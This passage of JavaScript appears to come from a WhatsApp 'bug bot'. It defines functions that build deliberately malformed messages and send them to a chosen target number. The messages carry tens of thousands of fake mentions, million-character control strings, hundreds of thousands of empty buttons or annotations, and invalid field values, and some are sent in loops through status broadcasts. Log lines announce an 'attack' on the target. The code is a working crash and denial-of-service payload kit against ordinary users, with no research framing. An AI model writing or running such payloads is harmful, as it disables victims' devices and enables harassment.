  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "мαηтα'χ"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await otax.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await otax.relayMessage(isTarget, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

async function OtaSuperDelay(otax, target, mention) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "ᴏᴛᴀx一緒 Crash" + "ោ៝".repeat(10000),
    title: "ᴏᴛᴀx一緒",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.youtube.com/@iqbhalkeifer25",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "ᴏᴛᴀx一緒",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "OtaxClouds"
    },
    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic
        },
        embeddedAction: true
      }
    ]
  };

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: { videoMessage }
    }
  }, {});

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await otax.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    });
  }
}

async function OtaDelay(target) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: target,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await otax.relayMessage(target, stickerMsg.message, { messageId: stickerMsg.key.id });
}

async function ProtoX(target, mention) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  const generateMessage = {
    viewOnceMessage: {
      message: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0, 70, 137, 73, 190, 145, 0, 44,
            165, 102, 153, 233, 111, 114, 69, 10,
            55, 61, 186, 131, 245, 153, 93, 211
          ]),
          fileLength: 432722,
          seconds: 26,
          ptt: false,
          mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254, 75, 254,
            190, 229, 25, 16, 78, 48, 98, 117,
            42, 71, 65, 199, 10, 164, 16, 57,
            189, 229, 54, 93, 69, 6, 212, 145
          ]),
          fileEncSha256: Buffer.from([
            29, 27, 247, 158, 114, 50, 140, 73,
            40, 108, 77, 206, 2, 12, 84, 131,
            54, 42, 63, 11, 46, 208, 136, 131,
            224, 87, 18, 220, 254, 211, 83, 153
          ]),
          directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1746275400,
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await otax.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "OtaXxx - INVISIBLE" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function Location(target) {

  const generateLocationMessage = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: true,
          degreesLongitude: true,
          name: "OtaXxx",
          address: "\u0003",
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 2000 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: [
              target,
              ...Array.from({ length: 1000000 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const locationMsg = generateWAMessageFromContent(target, generateLocationMessage, {});

  await otax.relayMessage(target, locationMsg.message, {
    messageId: locationMsg.key.id
  });
}

async function locationX(otax, target) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

  const generateLocationMessage = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "мαηтα'χ",
          address: "\u0000",
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 2000 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: [
              target,
              ...Array.from({ length: 2000 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {});

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  }, {
    participant: target
  });
}
async function OtaxAyunBelovedX(otax, target, mention) {


  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ¿Otax Here¿ ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
              version: 3
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );

  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`𝘰𝘵𝘢𝘹 𝘴𝘦𝘥𝘢𝘯𝘨 𝘮𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘢𝘵𝘵𝘢𝘤𝘬 𝘬𝘦 ${target}`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }




  const textMsg = {
    interactiveMessage: {
      header: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
          fileLength: "93217",
          caption: "7eppsynC",
          height: 1080,
          width: 1080,
          mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
          fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
          directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1778142659",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [
            9999999999999999999,
            9999999999999999999,
            9999999999999999999,
            9999999999999999999
          ],
          midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
        },
        title: "MantaXxx",
        hasMediaAttachment: true
      },
      body: {
        text: "\0"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      }
    }
  }

  const interMsg = {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "status@broadcast",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Business Assistant",
              creator: "XzC - Expos3d"
            },
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`,
              type: 1
            })),
            participant: target
          },
          body: {
            text: "мαηтα'χ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }
  const interMsg2 = {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "xx78ONox8l/eqf3pYnJcMwiBCse3FVLKkk9jdfP5oPI=",
      fileLength: "275719",
      seconds: 15,
      mediaKey: "LIHnYC8TN+vB3X9ed+nbu04NRdJ5PCmnHLXwu26o7RE=",
      height: -720,
      width: 720,
      fileEncSha256: "6a5lF9qeH/js+wV8W9fsrgVlXTSCd5htFyLKOCqzoHc=",
      directPath:
        "/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1772045071",
      jpegThumbnail: Buffer.alloc(0),
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        statusSourceType: "IMAGE",
        isForwarded: true,
        forwardingScore: 999,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net",
          businessDescription: null,
        },
      },
      streamingSidecar:
        "/PFxy0I/BUf8vbt/pW0sJ2j35YorqVHaII+thZ6V7yBUnox3c4QatbRETk7b2zb3nlQ=",
      thumbnailDirectPath:
        "/v/t62.36147-24/593729676_1666419884645510_6285328431371507107_n.enc?ccb=11-4&oh=01_Q5Aa3wE2rCOu-EHBRz-yTOwRKjTlNItBVyfvepZpPpsmtDULhw&oe=69C69DFE&_nc_sid=5e03e0",
      thumbnailSha256:
        "Cjw/0a5/5hzXKuDb6Rku26kazUYCZo0pyK8Xz35ecmo=",
      thumbnailEncSha256:
        "DNT9rfoBh/sCwpuOIr27W/9DwsUjP/BhZjpy3iPqFG0=",
      annotations: Array.from({ length: 200000 }, () => ({
        shouldSkipConfirmation: true,
        embeddedContent: {
          embeddedMusic: {
            author: `suck my dick ¿ `,
            title: " Threesixty ",
          }
        },
        embeddedAction: true,
      })),
    }
  }

  const statusMessages = [textMsg, interMsg, interMsg2]

  function wrapGroupStatusV2(innerMessage) {
    return {
      groupStatusMessageV2: {
        message: innerMessage
      }
    }
  }

  let lastKey = null;
  for (let i = 0; i < 10; i++) {
    const biji2Id = crypto.randomBytes(16).toString('hex').toUpperCase()
    await otax.relayMessage(target, wrapGroupStatusV2(biji2.message), {
      messageId: biji2Id,
      participant: { jid: target }
    });

    for (const content of statusMessages) {
      const msgId = crypto.randomBytes(16).toString('hex').toUpperCase()
      const wrapped = wrapGroupStatusV2(content)
      await otax.relayMessage(target, wrapped, {
        messageId: msgId,
        participant: { jid: target }
      })
      lastKey = { remoteJid: target, id: msgId, participant: target }
    }
    if (i < 9) {
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }

  const mantaImageMessage = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
    fileLength: 162903,
    height: 1080,
    width: 1080,
    mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
    fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
    directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
    mediaKeyTimestamp: 1775033718,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA"
    },
    scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
    scanLengths: [
      10365,
      39303,
      40429,
      72806
    ],
    midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
  }

  let mantaCards = [];
  for (let z = 0; z < 700; z++) {
    mantaCards.push({
      header: {
        imageMessage: mantaImageMessage,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    })
  }
  let mantaMsg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\0" },
          carouselMessage: {
            cards: mantaCards
          }
        }
      }
    }
  }, {});
  await otax.relayMessage(target, mantaMsg.message, {
    participant: { jid: target }
  });

  if (mention && lastKey) {
    await otax.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: lastKey,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
          },
        ],
      }
    );
  }
}

async function ofmEr(otax, target) {
  await otax.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "status@broadcast",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Business Assistant",
              creator: "XzC - Expos3d"
            },
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`,
              type: 1
            })),
            participant: otax.user.id
          },
          body: {
            text: "мαηтα'χ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })
}
async function stInt(otax, target) {
  for (let z = 0; z < 10; z++) {
    let ZxY = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
